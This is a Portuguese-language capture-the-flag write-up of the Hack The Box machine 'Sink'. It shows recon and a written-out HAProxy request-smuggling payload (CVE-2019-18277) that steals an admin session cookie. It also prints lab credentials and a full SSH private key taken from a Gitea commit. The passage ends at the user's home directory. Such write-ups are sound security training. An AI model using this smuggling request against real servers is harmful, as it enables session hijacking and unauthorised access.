<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="HTB Sink Writeup" /><meta name="author" content="Hastur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/htb-sink-writeup/" /><meta property="og:url" content="https://h41stur.github.io/posts/htb-sink-writeup/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/htb/htb-sink-logo.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-16T21:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/htb/htb-sink-logo.png" /><meta property="twitter:title" content="HTB Sink Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hastur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hastur"},"dateModified":"2021-12-13T15:54:13-03:00","datePublished":"2021-09-16T21:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"HTB Sink Writeup","image":"https://h41stur.github.io/img/htb/htb-sink-logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/htb-sink-writeup/"},"url":"https://h41stur.github.io/posts/htb-sink-writeup/"}</script><title>HTB Sink Writeup | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Sink Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB Sink Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Hastur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 16, 2021, 9:00 PM -0300" >Sep 16, 2021<i class="unloaded">2021-09-16T21:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 13, 2021, 3:54 PM -0300" >Dec 13, 2021<i class="unloaded">2021-12-13T15:54:13-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1542 words">8 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/htb/htb-sink-logo.png" /></p><p><br /></p><div class="table-wrapper"><table><thead><tr><th>Nome<th>Sink<tbody><tr><td>IP<td>10.10.10.225<tr><td>Pontos<td>50<tr><td>OS<td>Linux<tr><td>Nível<td>Insane</table></div><p><br /></p><p>Esta máquina rendeu algumas horas de pesquisa e muita leitura de arquivos, necessitou de bastante paciência e procura de informações.</p><p>Vamos ao tralho!</p><h2 id="recon">RECON</h2><h3 id="nmap">Nmap</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Sink]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.10.225 <span class="nt">--min-rate</span><span class="o">=</span>512 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
|     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>2147483647
|     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>9d90f44fb52ce3fa<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>BfHNd7vcofRu_lA4Ie4IgUXAMHo6MTYzMTgzMzYzNDM1NTUxNTEwOQ<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Fri, 17 Sep 2021 23:07:14 GMT<span class="p">;</span> HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 16 Sep 2021 23:07:14 GMT
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en-US"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"theme-"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head </span>data-suburl<span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"manifest"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/manifest.json"</span> <span class="nv">crossorigin</span><span class="o">=</span><span class="s2">"use-credentials"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"theme-color"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"#6cc644"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea - Git with a cup of tea"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=65211b52dbf6b99c; Path=/; HttpOnly
|     Set-Cookie: _csrf=vMhSEXnXeTofNKyqQFGBD9B8UY46MTYzMTgzMzY0MDM5NzUxNTM4Nw; Path=/; Expires=Fri, 17 Sep 2021 23:07:20 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 16 Sep 2021 23:07:20 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="</span>en-US<span class="s2">" class="</span>theme-<span class="s2">"&gt;
|     &lt;head data-suburl=""&gt;
|     &lt;meta charset="</span>utf-8<span class="s2">"&gt;
|     &lt;meta name="</span>viewport<span class="s2">" content="</span><span class="nv">width</span><span class="o">=</span>device-width, initial-scale<span class="o">=</span>1<span class="s2">"&gt;
|     &lt;meta http-equiv="</span>x-ua-compatible<span class="s2">" content="</span><span class="nv">ie</span><span class="o">=</span>edge<span class="s2">"&gt;
|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
|     &lt;link rel="</span>manifest<span class="s2">" href="</span>/manifest.json<span class="s2">" crossorigin="</span>use-credentials<span class="s2">"&gt;
|     &lt;meta name="</span>theme-color<span class="s2">" content="</span><span class="c">#6cc644"&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea - Git with a cup of tea"</span> /&gt;
|_    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
| http-methods: 
|_  Supported Methods: OPTIONS POST GET HEAD
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops

</span></pre></table></code></div></div><p>O scan com nmap nos trouxe algumas informações interessantes, temos a porta 22-SSH, 3000-HTTP com o título <code class="language-plaintext highlighter-rouge">Gitea</code> e 5000-HTTP com o título <code class="language-plaintext highlighter-rouge">Sink Devops</code> e server-header <code class="language-plaintext highlighter-rouge">gunicorn/20.0.0</code>.</p><p>Vamos começar pela porta 5000.</p><h3 id="porta-5000">Porta 5000</h3><p><img data-proofer-ignore data-src="/img/htb/htb-sink-1.png" /></p><p>Encontramos a tela de login da <code class="language-plaintext highlighter-rouge">Sink Devops</code>, ainda não temos credenciais, mas existe um link para cadastro, vamos registrar um usuário e tentar login.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-2.png" /></p><p>Conseguimos logar com sucesso!</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-3.png" /></p><p>Após um bom tempo de enumeração, decidi interceptar uma requisição com o <code class="language-plaintext highlighter-rouge">BURP</code> e encontrei algo interessante:</p><blockquote><p>Via: haproxy</p></blockquote><p><img data-proofer-ignore data-src="/img/htb/htb-sink-4.png" /></p><p>Depois de um bom tempo pesquisando, encontrei o <code class="language-plaintext highlighter-rouge">CVE-2019-18277</code> que fala sobre uma vulnerabilidade de <code class="language-plaintext highlighter-rouge">request smuggling</code>. O artigo em questão pode ser lido <a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">aqui</a>.</p><p>Após estudar o artigo, descobri que podemos alterar uma requisição para obter um <code class="language-plaintext highlighter-rouge">CSRF</code>, vamos à exploração.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-5.png" /></p><p>Primeiro eu interceptei com o BURP uma requisição para inserir um comentário e enviei para o <code class="language-plaintext highlighter-rouge">Repeater</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-6.png" /></p><p>Agora altere a requisição para o formato abaixo e com os mesmos <code class="language-plaintext highlighter-rouge">_csrf</code> e <code class="language-plaintext highlighter-rouge">Cookie</code> mas não mude o seu <code class="language-plaintext highlighter-rouge">session cookie</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>POST /comment HTTP/1.1
Host: 10.10.10.225:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 357
Origin: http://10.10.10.225:5000
DNT: 1
Connection: keep-alive
Referer: http://10.10.10.225:5000/home
Cookie: lang=zh-CN; i_like_gitea=1e8c376ed33ccd6e; _csrf=bsRZO43k9rTxqa5xKtfSmm747Y86MTYxMjc2MjIxNjA0MTE3MDI2MA; session=eyJlbWFpbCI6Img0MXN0dXJAaDQxc3R1ci5jb20ifQ.YUPQMg.1gIaOZDmrFyg_sGLg3TlV-LTkz8
Upgrade-Insecure-Requests: 1
Transfer-Encoding: Cwo=chunked

5
msg=h
0

POST /comment HTTP/1.1
Host: localhost:5000
Cookie: lang=zh-CN; i_like_gitea=1e8c376ed33ccd6e; _csrf=bsRZO43k9rTxqa5xKtfSmm747Y86MTYxMjc2MjIxNjA0MTE3MDI2MA; session=eyJlbWFpbCI6Img0MXN0dXJAaDQxc3R1ci5jb20ifQ.YUPQMg.1gIaOZDmrFyg_sGLg3TlV-LTkz8
Content-Length: 300
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

msg=
</pre></table></code></div></div><p>É importante que habilitemos a opção <code class="language-plaintext highlighter-rouge">Show non-printable chars</code> no BURP.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-7.png" /></p><p>Vários caracteres não printáveis foram mostrados, além deles, podemos ver os caracteres <code class="language-plaintext highlighter-rouge">Cwo=</code> em <code class="language-plaintext highlighter-rouge">Transfer-Encoding</code>, estes caracteres estão em base64, para descriptá-lo, precisamos selecioná-lo e pressionar <code class="language-plaintext highlighter-rouge">Ctrl+Shift+b</code> e a requisição ficará como abaixo:</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-8.png" /></p><p>Agora enviamos a requisição.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-9.png" /></p><p>Agora podemos recarregar a página e capturar o cookie do <code class="language-plaintext highlighter-rouge">admin</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-10.png" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GET /notes/delete/1234 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: */* Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YUPKYw.hFHfoAVd5-WSHIRdJcpJD5qIQJ4 X-Forwarded-For: 127.0.0.1 
</pre></table></code></div></div><p>Agora podemos alterar nosso cookie nas opções de desenvolvedor do browser, no caso do Firefox, pressionando <code class="language-plaintext highlighter-rouge">F12</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-11.png" /></p><p>Ao recarregar a página, estamos acessando como admin!!!</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-12.png" /></p><p>Ao navegarmos até <code class="language-plaintext highlighter-rouge">Notes</code>, vemos três notas escritas, vamos checar seu conteúdo.</p><p><code class="language-plaintext highlighter-rouge">Note (1)</code></p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-13.png" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&amp;zEx{4]zz 
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Note (2)</code></p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-14.png" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L&gt;Z3})zzfQ3 
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Note (3)</code></p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-15.png" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8&lt;H6GK\{*L.fB3C 
</pre></table></code></div></div><p>Conseguimos três credenciais!!!</p><p>Porém, nenhuma delas funcionou com acesso ssh, nos resta tentar a próxima porta do alvo.</p><h2 id="porta-3000">Porta 3000</h2><p><img data-proofer-ignore data-src="/img/htb/htb-sink-16.png" /></p><p>Temos a tela inicial do <a href="https://gitea.io/en-us/">Gitea</a>, vamos tentar acesso com as credenciais das notas, como primeira tentativa, vamos utilizar a credencial <code class="language-plaintext highlighter-rouge">root:FaH@3L&gt;Z3})zzfQ3</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-17.png" /></p><p>E conseguimos acesso!!!</p><p>Temos um <code class="language-plaintext highlighter-rouge">Git</code> com muitos commits. Aqui entra uma observação pessoal: Passei várias horas enumerando os commits até encontrar informações importantes para serem usadas.</p><p>Entre os commits, podemos encontrar uma chave <code class="language-plaintext highlighter-rouge">id_rsa_marcus</code> em <a href="http://10.10.10.225:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e">http://10.10.10.225:3000/root/Key_Management/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e</a>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-18.png" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
</pre></table></code></div></div><p>Vamos salvá-la e tentar um acesso ssh.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Sink]
└─<span class="nv">$ </span>vim id_rsa_marcus                                                                                                                                                                                                                    1 ⨯
                                                                                                                                                                                                                                             
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Sink]
└─<span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa_marcus 
                                                                                                                                                                                                                                             
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Sink]
└─<span class="nv">$ </span>ssh marcus@10.10.10.225 <span class="nt">-i</span> id_rsa_marcus 
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-sink-19.png" /></p><p>E conseguimos nosso primeiro acesso ao server!!!</p><p>A flag <code class="language-plaintext highlighter-rouge">user.txt</code> está no diretório do usuário marcus.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>marcus@sink:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwxr-xr-x 4 marcus marcus 4096 Jan 27  2021 <span class="nb">.</span>
drwxr-xr-x 5 root   root   4096 Dec  2  2020 ..
lrwxrwxrwx 1 marcus marcus    9 Dec  1  2020 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 marcus marcus  220 Dec  1  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 marcus marcus 3771 Dec  1  2020 .bashrc
drwx------ 2 marcus marcus 4096 Jan 27  2021 .cache
<span class="nt">-rw-r--r--</span> 1 marcus marcus  807 Dec  1  2020 .profile
drwx------ 2 marcus marcus 4096 Dec  2  2020 .ssh
<span class="nt">-r--------</span> 1 marcus marcus   33 Sep 16 22:50 user.txt
